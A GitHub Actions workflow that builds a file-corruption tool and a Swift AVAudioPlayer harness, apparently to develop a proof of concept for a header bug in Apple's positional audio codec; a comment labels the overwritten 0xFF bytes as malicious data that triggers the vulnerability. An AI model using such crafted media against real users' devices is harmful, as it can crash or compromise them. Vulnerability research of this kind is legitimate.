name: Generate, Play, and Debug Audio Source
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-generate-and-debug:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: git clone https://github.com/encryptedcoderr/AppleTest2/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l

      # This script is a simple utility to corrupt a file at a specific offset.
      - name: Patch encodeme.mm to be a Simple File Corruptor
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm to be a simple corruption utility..."
          cat > encodeme.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #include <stdio.h>
          #include <stdlib.h>

          int main(int argc, const char * argv[]) {
              if (argc != 3) {
                  fprintf(stderr, "Usage: %s <file_to_corrupt> <offset_to_corrupt>\n", argv[0]);
                  return 1;
              }

              const char* filePath = argv[1];
              long offset = atol(argv[2]);

              FILE *file = fopen(filePath, "r+b");
              if (!file) {
                  fprintf(stderr, "Failed to open file: %s\n", filePath);
                  return 1;
              }

              fprintf(stderr, "Corrupting file at offset 0x%lx...\n", offset);
              fseek(file, offset, SEEK_SET);
              
              // This is the malicious data that triggers the vulnerability
              unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
              fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
              fclose(file);
              
              fprintf(stderr, "Corruption complete.\n");
              return 0;
          }
          EOF

      # New Step: Create a custom Swift harness that uses AVAudioPlayer
      - name: Create Swift Player Harness
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating Swift audio player harness..."
          cat > harness.swift << 'EOF'
          import Foundation
          import AVFoundation

          class PlayerDelegate: NSObject, AVAudioPlayerDelegate {
              var isPlaying = true
              func audioPlayerDidFinishPlaying(_ player: AVAudioPlayer, successfully flag: Bool) {
                  print("Playback finished. Success: \(flag)")
                  isPlaying = false
              }
              func audioPlayerDecodeErrorDidOccur(_ player: AVAudioPlayer, error: Error?) {
                  print("Decode error: \(error?.localizedDescription ?? "unknown error")")
                  isPlaying = false
              }
          }

          if CommandLine.arguments.count < 2 {
              print("Usage: ./harness <file_path>")
              exit(1)
          }

          let filePath = CommandLine.arguments[1]
          let fileURL = URL(fileURLWithPath: filePath)

          print("Attempting to play: \(filePath)")

          do {
              let delegate = PlayerDelegate()
              let audioPlayer = try AVAudioPlayer(contentsOf: fileURL)
              audioPlayer.delegate = delegate
              audioPlayer.play()
              
              print("Playback started...")
              // Keep the program running while the audio plays.
              while delegate.isPlaying {
                  RunLoop.main.run(until: Date(timeIntervalSinceNow: 0.1))
              }
              print("Harness finished.")

          } catch {
              print("Failed to initialize AVAudioPlayer: \(error.localizedDescription)")
              exit(1)
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile the C++ corruption utility
      - name: Compile Corruption Utility
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme_corruptor..."
          clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_corruptor
          if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
      
      # New Step: Compile the Swift player harness
      - name: Compile Swift Harness
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling Swift harness..."
          swiftc harness.swift -o harness
          if [ $? -ne 0 ]; then echo "Swift compilation failed."; exit 1; fi

      # This step now focuses on generating the JSON dump for manual analysis.
      - name: Generate Atom Dump for Manual Analysis
        id: generate_dump
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          set -x 
          
          echo "Installing Bento4 to generate an atom dump..."
          brew install bento4
          
          mp4dump --format json IMG_1027.mov > atom_dump.json

          echo "Atom dump generated. Please download the 'debug-and-poc-artifacts' artifact to analyze 'atom_dump.json' manually."
          
      # Upload just the atom dump for analysis
      - name: Upload Atom Dump
        uses: actions/upload-artifact@v4
        with:
          name: debug-artifacts
          path: AppleTest2/apple-positional-audio-codec-invalid-header-main/atom_dump.json
          retention-days: 7
